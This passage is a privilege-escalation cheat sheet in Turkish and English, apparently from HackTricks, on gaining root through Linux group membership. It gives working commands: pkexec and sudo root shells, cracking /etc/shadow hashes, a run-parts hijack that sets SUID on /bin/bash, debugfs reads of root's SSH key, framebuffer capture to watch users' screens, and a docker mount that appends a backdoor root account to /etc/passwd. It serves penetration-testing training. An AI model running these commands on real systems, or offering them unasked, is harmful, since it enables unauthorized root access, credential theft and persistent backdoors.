# İlginç Gruplar - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Grupları

### **PE - Method 1**

**Bazen**, **varsayılan olarak (veya bazı yazılımlar buna ihtiyaç duyduğu için)** **/etc/sudoers** dosyasında bu satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, **sudo veya admin grubuna ait herhangi bir kullanıcının sudo ile her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
```
sudo su
```
### PE - Yöntem 2

Tüm suid binary'lerini bul ve **Pkexec** binary'sinin varlığını kontrol et:
```bash
find / -perm -4000 2>/dev/null
```
Eğer **pkexec bir SUID binary** ise ve **sudo** veya **admin** grubuna aitseniz, `pkexec` kullanarak muhtemelen sudo olarak binary çalıştırabilirsiniz.\
Bunun nedeni tipik olarak bu grupların **polkit politikası** içinde olmasıdır. Bu politika temel olarak hangi grupların `pkexec` kullanabileceğini belirler. Kontrol etmek için:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Orada hangi grupların **pkexec** çalıştırmaya izinli olduğunu ve bazı Linux dağıtımlarında **varsayılan olarak** **sudo** ve **admin** gruplarının göründüğünü bulacaksınız.

**root olmak için şu komutu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Eğer **pkexec**'i çalıştırmaya çalışırsanız ve şu **hata**yı alırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Sorun izinlerinizin olmaması değil, GUI olmadan bağlı olmamanız**. Bu sorun için bir geçici çözüm burada: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). İhtiyacınız olan **2 farklı ssh oturumu**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Grubu

**Bazen**, **varsayılan olarak** **/etc/sudoers** dosyası içinde şu satırı bulabilirsiniz:
```
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait herhangi bir kullanıcının sudo ile her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum buysa, **root olmak için sadece şunu çalıştırabilirsiniz**:
```
sudo su
```
## Shadow Grubu

**group shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Dosyayı oku ve **crack some hashes**.

Hashes triyajı sırasında kilit durumuna dair kısa bir not:
- `!` veya `*` içeren girdiler genellikle parola ile giriş için etkileşimli değildir.
- `!hash` genellikle bir parola ayarlandığını ve sonra kilitlendiğini gösterir.
- `*` genellikle geçerli bir password hash'in hiç ayarlanmadığı anlamına gelir.
Bu, doğrudan giriş engellendiğinde bile hesap sınıflandırması için faydalıdır.

## Staff Grubu

**staff**: kullanıcıların root ayrıcalığı gerektirmeden sisteme yerel değişiklikler eklemelerine (`/usr/local`) izin verir (dikkat: `/usr/local/bin` içindeki çalıştırılabilir dosyalar herhangi bir kullanıcının $PATH değişkeninde yer alır ve aynı ada sahip dosyalarla `/bin` ve `/usr/bin` içindekilerin üzerine "override" edebilir). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)

Debian dağıtımlarında, $PATH değişkeni `/usr/local/`'ın ayrıcalıklı bir kullanıcı olun olsun en yüksek öncelikte çalıştırılacağını gösterir.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Eğer `/usr/local` içindeki bazı programları ele geçirebilirsek, kolayca root elde edebiliriz.

`run-parts` programını ele geçirmek, root'a kolayca yükselmenin bir yoludur; çünkü birçok program `run-parts` benzeri bir aracı çalıştırır (ör. crontab, ssh oturum açmalarında).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
veya yeni bir ssh oturumuna giriş yapıldığında.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Grubu

Bu ayrıcalık neredeyse **root erişimine eşdeğerdir** çünkü makine içindeki tüm verilere erişebilirsiniz.

Dosyalar:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
debugfs kullanarak ayrıca **dosya yazabileceğinizi** unutmayın. Örneğin `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, root'a ait dosyaları (ör. `/etc/shadow` veya `/etc/passwd`) yazmaya çalışırsanız "**İzin reddedildi**" hatası alırsınız.

## Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilirsiniz ve aşağıdaki gibi bir çıktı gösterir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, makinede kullanıcının **yossi'nin fiziksel olarak bir terminale bağlı olduğunu** gösterir.

**video group** ekran çıktısını görüntüleme erişimine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunu yapmak için **ekrandaki mevcut görüntüyü yakalamak** (ham veri olarak) ve ekranın kullandığı çözünürlüğü almak gerekir. Ekran verisi `/dev/fb0` içine kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` dosyasında bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:

![](<../../../images/image (463).png>)

Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):

![](<../../../images/image (317).png>)

## Root Grubu

Görünüşe göre varsayılan olarak **root grubunun üyeleri**, bazı **servis** yapılandırma dosyalarını, bazı **kütüphane** dosyalarını veya escalate privileges için kullanılabilecek **diğer ilginç şeyleri** **değiştirme** erişimine sahip olabilir...

**Root üyelerinin hangi dosyaları değiştirebileceğini kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

**Ev sahibi makinenin kök dosya sistemini bir instance’ın volume’üne bağlayabilirsiniz**, böylece instance başladığında hemen o volume içine bir `chroot` yüklenir. Bu pratikte makinede root yetkisi verir.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group


{{#ref}}
./
{{#endref}}

## Adm Group

Genellikle grup **`adm`**'nin **üyeleri**, _/var/log/_ içinde bulunan **log dosyalarını okuma** iznine sahiptir.\
Dolayısıyla, bu gruptan bir kullanıcıyı ele geçirdiyseniz kesinlikle **loglara bakmalısınız**.

## Backup / Operator / lp / Mail groups

Bu gruplar genellikle doğrudan root vektörleri olmaktan ziyade **credential-discovery** vektörleridir:
- **backup**: ayar dosyaları, anahtarlar, DB dump'ları veya token'lar içeren arşivleri ortaya çıkarabilir.
- **operator**: platforma özgü operasyonel erişim, hassas runtime verilerinin leak olmasına neden olabilir.
- **lp**: yazdırma kuyrukları/spool'lar belge içeriklerini barındırabilir.
- **mail**: mail spool'ları sıfırlama linkleri, OTP'ler ve dahili kimlik bilgilerini ortaya çıkarabilir.

Buradaki üyeliği yüksek değerli bir veri ifşası bulgusu olarak değerlendirin ve password/token reuse üzerinden pivot yapın.

## Auth group

Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
